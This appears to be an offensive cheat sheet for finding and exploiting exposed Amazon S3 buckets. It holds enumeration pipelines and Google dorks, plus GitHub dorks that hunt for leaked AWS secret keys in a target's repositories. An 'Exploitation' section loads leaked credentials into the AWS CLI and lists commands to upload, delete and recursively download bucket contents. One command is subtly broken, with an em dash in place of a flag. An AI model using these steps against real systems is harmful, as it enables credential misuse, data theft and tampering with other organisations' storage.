

Bucket enumeration :
```bash
assetfinder --subs-only canva.com | httprobe | anew hosts; meg -d 1000 -v /; gf s3-buckets
ruby lazys3.rb <COMPANY> 
```


%c0 error character in url :
```bash
https://target.com/%c0
```

- Check wapplayzer extension
- Check the source code of application search for s3 in source code.
- Right-click on any image of the target application and open image in new tab. If the image URL looks like this: http://xyz.s3.amazonaws.com/images/b1.gif


some google dorking :
```bash
site:http://s3.amazonaws.com intitle:index.of.bucket
site:http://amazonaws.com inurl:".s3.amazonaws.com/"
site:.s3.amazonaws.com "Company"
intitle:index.of.bucket
site:http://s3.amazonaws.com intitle:Bucket loading
site:*.amazonaws.com inurl:index.html
Bucket Date Modified



site:s3.amazonaws.com "target.com"
site:*.s3.amazonaws.com "target.com"
site:s3-external-1.amazonaws.com "target.com"
site:s3.dualstack.us-east-1.amazonaws.com "target.com"
site:amazonaws.com inurl:s3.amazonaws.com 
site:s3.amazonaws.com intitle:"index of"  
site:s3.amazonaws.com inurl:".s3.amazonaws.com/"  
site:s3.amazonaws.com intitle:"index of" "bucket"

(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
```

auotmated tools and command :
https://github.com/Atharv834/S3BucketMisconf
https://github.com/gwen001/s3-buckets-finder
```bash
subfinder -d target.com -all -silent | httpx-toolkit -sc -title -td | grep "Amazon S3"
subfinder -d target.com -all -silent | nuclei -t /home/somx/.local/nuclei-templates/http/technologies/s3-detect.yaml

katana -u https://site.com/ -d 5 -jc | grep '\.js$' | tee alljs.txt
cat alljs.txt | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*\.s3\.amazonaws\.com[^" ]*' | sort -u


cewl https://site.com/ -d 3 -w file.txt
s3scanner -bucket-file file.txt -enumerate -threads 10 | grep -aE 'AllUsers: \[.*(READ|WRITE|FULL).*]'


./cloud_enum.py -k somecompany -k somecompany.io -k blockchaindoohickey

```


github dorking :
```bash
org:target "amazonaws"
org:target "bucket_name" 
org:target "aws_access_key"
org:target "aws_access_key_id"
org:target "aws_key"
org:target "aws_secret"
org:target "aws_secret_key"
org:target "S3_BUCKET"
```


use online tools :
https://buckets.grayhatwarfare.com/
https://osint.sh/buckets/

chrome extension:
https://chromewebstore.google.com/detail/s3bucketlist/anngjobjhcbancaaogmlcffohpmcniki?hl=en



Exploitation 
configure enviornment:
```bash
aws configure
#enter the leaked id
#enter the leadked api key
```


Buckets with "Full Control" permission allow file uploads and deletions which could lead to security risks.
```bash
aws s3api get-bucket-acl — bucket <bucket-name>


#read and write 
aws s3 ls s3://[bucketname] --no-sign-request
aws s3 cp file.txt s3://[bucketname] --no-sign-request
aws s3 rm s3://[bucketname]/file.txt --no-sign-request
aws s3 cp s3://[bucketname]/ ./ --recursive --no-sign-request
aws s3 mv <file> s3://<bucket-name>



```